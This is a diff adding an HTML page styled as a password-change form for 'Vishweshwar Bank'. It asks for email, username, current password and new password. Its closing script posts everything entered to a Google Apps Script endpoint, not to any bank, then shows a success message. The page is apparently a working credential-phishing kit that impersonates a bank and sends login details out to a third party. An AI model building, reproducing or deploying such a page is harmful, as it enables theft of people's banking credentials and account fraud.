@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Password Change - Vishweshwar Bank</title>
+
+  <style>
+    /* Global body styling */
+    @import url('https://fonts.googleapis.com/css?family=Montserrat:400,700&display=swap');
+*{
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    font-family: 'Montserrat', sans-serif;
+}
+
+.content{
+    position: relative;
+}
+
+form{
+    display: flex;
+    flex-direction: column;
+    position: relative;
+    overflow: hidden;
+    background: #ffffffdb;
+    padding: 40px 40px 0px 40px;
+    overflow: hidden;
+    width: 460px;
+    box-shadow: 5px 5px 20px 10px rgba(227, 4, 4, 0.322);
+    border-radius: 15px;
+    border: 1px solid rgb(141, 141, 141);
+    top: 50px;
+    position: relative;
+}
+label{
+    display: flex;
+    left: -30px;
+    margin: 15px;
+    color: rgb(255, 0, 0);
+    position: relative;
+}
+
+input{
+    margin-top: -40px;
+    left: 45%;
+    overflow: hidden;
+    padding: 10px 15px 10px 15px;
+    width: 225px;
+    margin-bottom: 20px;
+    border-radius: 6px;
+    border: 1px solid rgb(119, 119, 119);
+    display: flex;
+    position: relative;
+   
+    
+}
+
+.click{
+    margin: 10px;
+    background-color: rgb(4, 162, 4);
+    color: #fff;
+    border: none;
+    font-size: 15px;
+    font-weight: bold;
+    padding: 10px 20px;
+    border-radius: 6px;
+    margin: 20px;
+    width: 346px;
+    cursor: pointer;
+
+}
+
+.click:hover{
+    background-color: rgb(5, 134, 5);
+}
+
+textarea{
+    padding: 10px 15px;
+    width: 322px;
+    height: 50px;
+    margin-bottom: 10px;
+    border-radius: 6px;
+    border: 1px solid rgb(147, 8, 8);
+    position: relative;
+
+}
+
+.line{
+    font-size: 10px;
+    color: rgb(33, 33, 33);
+    margin: 6px;
+}
+
+.custom_select{
+    position: relative;
+    width: 100%;
+    height: 40px;
+}
+
+  </style>
+</head>
+<body>
+  <!-- Fixed Header with Logo -->
+  <header>
+    <img src="logo-Vishweshwar.png" width="100%" alt="Vishweshwar Bank Logo">
+  </header>
+
+  <!-- Main Content with Form -->
+  <main>
+    <div class="content">
+      <center>
+      <form method="post" action="" name="product" id="product">
+          <label for="naem"><b>Email Address</b></label>
+          <input class="fil" type="text" name="Email" placeholder="Enter your Email Address" required="">
+
+          <label for="naem"><b>Username</b></label>
+          <input class="fil" type="text" name="Username" placeholder="Enter your Username " required="">
+
+          <label for="naem"><b>Current Password</b></label>
+          <input class="fil" type="text" name="Current Password" placeholder="Enter your Current Password" required="">
+     
+          <label for="naem"><b>New Password</b></label>
+          <input class="fil" type="text" name="New Password" placeholder="Enter your New Password" required="">
+
+          <label for="naem"><b>Confirm Password</b></label>
+          <input class="fil" type="text" name="Confirm Password" placeholder="Enter your Confirm Password" required="">
+
+          <button class="click">Submit ➔</button>
+      </form>
+      </center>
+  </div>
+  </main>
+
+  <script>
+    const scriptURL = 'https://script.google.com/macros/s/AKfycbzAUZgUGfCM3aiLXKSEAz0lNt13BLADRJshHaBu6BHGXd67N9wMEcg8BYscVtAkuH9y/exec'
+    const form = document.forms['product']
+
+    form.addEventListener('submit', e => {
+    e.preventDefault()
+    fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+        .then(response => alert("Your form has been Submitted Successfully!" ))
+        .then(() => {  window.location.reload(); })
+        .catch(error => console.error('Error!', error.message))
+    })
+  </script>
+</body>
+</html>
